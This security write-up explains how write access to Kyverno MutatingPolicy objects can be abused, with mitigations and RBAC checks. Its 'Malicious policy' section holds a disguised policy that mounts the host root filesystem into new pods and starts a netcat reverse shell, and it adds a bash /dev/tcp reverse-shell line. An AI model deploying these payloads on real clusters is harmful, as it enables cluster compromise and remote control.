---
title: Abusing Kyverno MutatingPolicy
description: How MutatingPolicy access can be abused to change pods during admission in Kyverno
category: offensive
createdAt: 2026-04-07
impact: >-
  If an attacker can create or update Kyverno `MutatingPolicy` objects, they can change pod specs during admission without touching each workload directly. That can enable cluster-wide persistence, credential exposure, and unexpected runtime behavior across many namespaces, depending on match constraints.
mitigation:
  - Treat write access to Kyverno policy types (`MutatingPolicy`, `ValidatingPolicy`, `GeneratingPolicy`, and namespaced variants) as high-impact permissions and avoid granting it to CI or namespace operators by default.
  - Keep Kyverno’s own controller permissions and service accounts protected. If those identities are compromised, policy changes become a control-plane primitive.
  - Monitor for changes to Kyverno policy objects and for sudden drift between Git manifests and live pod specs after admission.
mitreTechniques:
  - T1578
  - T1610
tools:
  - kyverno
  - kubectl
kubernetesVersion: 1.26+
references: |
  - [Kyverno policy types overview](https://kyverno.io/docs/policy-types/overview/) (ClusterPolicy deprecated in v1.17; CEL policy types stable)
  - [MutatingPolicy](https://kyverno.io/docs/policy-types/mutating-policy/) (Kyverno v1.17)
  - [Announcing Kyverno Release 1.17](https://kyverno.io/blog/2026/02/02/announcing-kyverno-release-1.17) (deprecation schedule and rationale)
---

Kyverno v1.17 deprecates `ClusterPolicy` and shifts new policy authoring to CEL-based types such as `MutatingPolicy` (`policies.kyverno.io/v1`). `ClusterPolicy` still works today, but new mutation rules should be written as `MutatingPolicy` or `NamespacedMutatingPolicy`.

Mutation runs in the admission path. If an identity can write mutation policy objects, it can rewrite future pods as they are created. That scales far beyond editing individual Deployments and can blend into normal rollout traffic.

## What access enables

Write access to `MutatingPolicy` lets an attacker change pod fields at creation time. The specific outcome depends on what the policy matches and what it mutates, but common categories are adding containers, changing images, adding env vars, and adding volumes or mounts. If that scope is broad, the effect spreads through normal deploys, restarts, and autoscaling.

## Non-malicious policy

This example shows the shape of a `MutatingPolicy` in the new API without using a harmful payload. It simply adds a label to new pods.

```yaml
apiVersion: policies.kyverno.io/v1
kind: MutatingPolicy
metadata:
  name: add-managed-label
spec:
  matchConstraints:
    resourceRules:
      - apiGroups: [""]
        apiVersions: ["v1"]
        operations: ["CREATE"]
        resources: ["pods"]
  mutations:
    - patchType: ApplyConfiguration
      applyConfiguration:
        expression: >
          Object{
            metadata: Object.metadata{
              labels: Object.metadata.labels{
                "policy.kyverno.io/managed": "true"
              }
            }
          }
```

## Malicious policy

Below is an example of a policy with a legitimate name that actually contains a backdoor, enabling a reverse connection to an attacker.

```yaml
kubectl apply -f - <<'EOF'
apiVersion: policies.kyverno.io/v1
kind: MutatingPolicy
metadata:
  name: inject-sidecar-defaults
spec:
  matchConstraints:
    resourceRules:
      - apiGroups: [""]
        apiVersions: ["v1"]
        operations: ["CREATE"]
        resources: ["pods"]
  mutations:
    - patchType: JSONPatch
      jsonPatch:
        expression: |
          [
            JSONPatch{
              op: "add",
              path: "/spec/volumes/-",
              value: Object.spec.volumes{
                name: "host-root",
                hostPath: Object.spec.volumes.hostPath{
                  path: "/",
                  type: "Directory"
                }
              }
            },
            JSONPatch{
              op: "add",
              path: "/spec/containers/0/volumeMounts/-",
              value: Object.spec.containers.volumeMounts{
                name: "host-root",
                mountPath: "/host"
              }
            },
            JSONPatch{
              op: "add",
              path: "/spec/containers/0/command",
              value: ["sh", "-c", "nc <ip_addr> <port> -e sh && sleep infinity"]
            }
          ]
EOF
```

To embed a reverse shell, if the base image is BusyBox-based, you can use the method above. If it has Bash available, you can use `sh -i >& /dev/tcp/x.x.x.x/<port> 0>&1`.

> [!NOTE]
> This is not limited to Pods. You can also use Deployments, DaemonSets, or CronJobs, but you need to adjust the policy according to their respective specifications.

## RBAC for MutatingPolicy

The permission you care about is the ability to create or modify Kyverno policy types. With `create` or `patch` on `mutatingpolicies.policies.kyverno.io`, an attacker can register a `MutatingPolicy` that automatically mutates every newly 
created pod, injecting privileged configurations, mounting host filesystems, or overriding container commands without touching individual workload definitions.

Sample RBAC grant for create/update a `MutatingPolicy`:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: kyverno-mutatingpolicy-editor
rules:
  - apiGroups: ["policies.kyverno.io"]
    resources: ["mutatingpolicies"]
    verbs: ["get", "list", "watch", "create", "update", "patch"]
```

High-risk rule:

```yaml
rules:
  - apiGroups: ["policies.kyverno.io"]
    resources: ["mutatingpolicies"]
    verbs: ["get", "list", "watch", "create", "update", "patch", "delete"]
```

Read-only rule:

```yaml
rules:
  - apiGroups: ["policies.kyverno.io"]
    resources: ["mutatingpolicies"]
    verbs: ["get", "list", "watch"]
```

To check whether your identity can create or modify `MutatingPolicy`:

```bash
kubectl auth can-i create mutatingpolicies --all-namespaces
kubectl auth can-i update mutatingpolicies --all-namespaces
kubectl auth can-i patch mutatingpolicies --all-namespaces
kubectl auth can-i delete mutatingpolicies --all-namespaces
```

List policies and inspect what they target:

```bash
kubectl get mutatingpolicies
kubectl get mutatingpolicies -o yaml
```